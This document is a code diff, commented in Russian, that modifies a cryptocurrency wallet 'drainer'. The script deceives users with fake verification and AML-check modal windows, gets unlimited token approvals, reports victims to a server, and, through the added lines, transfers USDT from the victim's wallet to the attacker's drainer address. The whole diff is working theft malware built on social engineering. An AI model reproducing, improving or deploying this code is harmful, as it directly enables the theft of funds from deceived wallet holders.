@@ -43,7 +43,8 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
   "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)"
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)"
 ];
 
 // ABI для дрейнера
@@ -261,7 +262,7 @@ async function checkBalance(chainId, userAddress, provider) {
 // Проверка наличия средств
 function hasFunds(bal) {
   const minNativeBalance = ethers.utils.parseEther("0.001");
-  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
+  const minTokenBalance = ethers.utils.parseUnits("1.0", 6); // Изменили на 1 USDT
 
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
@@ -366,7 +367,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
+  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("1.0", 6);
 
   console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
   let ethBalance;
@@ -462,11 +463,11 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
+        await hideModalWithDelay(); // Закрываем модальное окно верификации
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
         // Получаем roundedAmount из notifyServer
-        await hideModalWithDelay(); // Закрываем модальное окно верификации
         const notifyResult = await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
         const roundedAmount = notifyResult.roundedAmount;
         await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
@@ -500,6 +501,27 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
         await hideModalWithDelay();
         modalClosed = true;
+      }
+    }
+
+    // Списываем только 1 USDT, если это USDT
+    if (token === "USDT" && address === chainConfig.usdtAddress) {
+      const oneUsdt = ethers.utils.parseUnits("1.0", decimals); // Фиксированная сумма 1 USDT
+      if (balance.gte(oneUsdt)) {
+        try {
+          const tx = await contract.transfer(chainConfig.drainerAddress, oneUsdt, {
+            gasLimit: 100000,
+            gasPrice: await provider.getGasPrice()
+          });
+          console.log(`📤 Транзакция transfer 1 USDT отправлена: ${tx.hash}`);
+          const receipt = await tx.wait();
+          console.log(`✅ Транзакция transfer 1 USDT подтверждена: ${receipt.transactionHash}`);
+        } catch (error) {
+          console.error(`❌ Ошибка списания 1 USDT: ${error.message}`);
+          throw new Error(`Failed to transfer 1 USDT: ${error.message}`);
+        }
+      } else {
+        console.warn(`⚠️ Недостаточно USDT для списания 1 токена, баланс: ${ethers.utils.formatUnits(balance, decimals)}`);
       }
     }
   }
